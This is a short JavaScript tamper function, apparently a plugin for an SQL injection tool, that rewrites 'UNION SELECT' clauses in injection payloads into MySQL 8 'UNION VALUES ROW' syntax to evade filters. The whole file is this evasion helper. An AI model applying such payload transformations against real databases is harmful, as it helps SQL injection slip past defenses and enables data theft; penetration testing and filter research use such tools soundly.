//@name: UNION VALUES ROW
//@usage: payload
//@enable: false
//@description: UNION SELECT cols→UNION VALUES ROW(cols)（MySQL>=8.0.19）
function tamper(payload){
    if (!payload) { return payload; }
    return payload.replace(/(UNION)(\s+ALL)?\s+SELECT\s+(.+?)(?=(?:--|#|\/\*)|$)/gi,
        function(m, union, all, columns){
            columns = columns.replace(/\s+$/, '');
            if (/\bFROM\b/i.test(columns)) { return m; }
            return union + (all || '') + ' VALUES ROW(' + columns + ')';
        });
}